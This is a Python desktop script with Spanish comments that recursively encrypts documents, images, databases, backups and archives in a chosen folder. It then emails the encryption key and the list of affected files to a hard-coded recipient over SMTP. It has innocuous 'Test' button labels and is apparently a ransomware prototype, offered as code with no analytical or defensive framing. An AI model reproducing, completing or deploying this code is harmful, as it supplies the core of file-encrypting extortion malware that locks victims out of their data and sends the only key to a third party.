import tkinter as tk
from tkinter import messagebox
from tkinter import filedialog
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import webbrowser
import os
from PIL import Image, ImageTk

def generate_key():
    return Fernet.generate_key()

def encrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as file:
        data = file.read()

    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data)

    with open(output_file, 'wb') as file:
        file.write(encrypted_data)

def send_key_by_email(sender_email, sender_password, receiver_email, key, encrypted_files):
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'Clave de encriptación y lista de archivos encriptados'

    # Crear el cuerpo del correo con la clave y la lista de archivos encriptados
    body = f"Guarda esta clave segura para descifrar el archivo:\n\n{key.decode()}\n\nLista de archivos encriptados:\n{', '.join(encrypted_files)}"
    message.attach(MIMEText(body, 'plain'))

    # Enviar el correo electrónico
    with smtplib.SMTP('smtp.example.com', 587) as server:  # Reemplaza con los detalles del servidor SMTP que desees utilizar
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

def on_test1():
    folder_path = filedialog.askdirectory()
    if folder_path:
        key = generate_key()
        extensions_to_encrypt = [".txt", ".docx", ".pdf", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".jpeg", ".png", ".csv", ".mp3", ".mp4", ".avi", ".zip", ".rar", ".sql", ".db", ".bak"] # Agrega aquí las extensiones que deseas encriptar

        encrypted_files = []

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                _, ext = os.path.splitext(file)
                if ext in extensions_to_encrypt:
                    input_file = os.path.join(root, file)
                    encrypted_file = input_file + ".encrypted"
                    encrypt_file(key, input_file, encrypted_file)
                    encrypted_files.append(file)

        messagebox.showinfo("Encriptación Exitosa", "Los archivos se han encriptado correctamente.")

        # Enviar la clave y la lista de archivos encriptados por correo electrónico
        sender_email = "test@test.com"
        sender_password = "tu_contraseña"
        receiver_email = "destinatario@test.com"
        send_key_by_email(sender_email, sender_password, receiver_email, key, encrypted_files)

def on_test2():
    files = os.listdir()
    encrypted_files = [file for file in files if file.endswith(".encrypted")]
    if encrypted_files:
        messagebox.showinfo("Archivos Encriptados", "Archivos encriptados encontrados:\n" + "\n".join(encrypted_files))
    else:
        messagebox.showinfo("Archivos Encriptados", "No se encontraron archivos encriptados.")

if __name__ == "__main__":
    root = tk.Tk()
    root.title("Encriptador con Menú")
    root.geometry("800x600")

    # Cargar imagen de fondo
    try:
        bg_image = Image.open("ruta_de_la_imagen_de_fondo.png")  # Reemplaza con la ruta de tu imagen de fondo
        bg_image = bg_image.resize((800, 600))  # Ajustar al tamaño de la ventana
        bg_image = ImageTk.PhotoImage(bg_image)
        bg_label = tk.Label(root, image=bg_image)
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)
    except Exception as e:
        messagebox.showerror("Error al cargar la imagen de fondo", str(e))

    # Botones
    test1_button = tk.Button(root, text="Test 1", command=on_test1)
    test1_button.pack(pady=10)

    test2_button = tk.Button(root, text="Test 2", command=on_test2)
    test2_button.pack(pady=10)

    root.mainloop()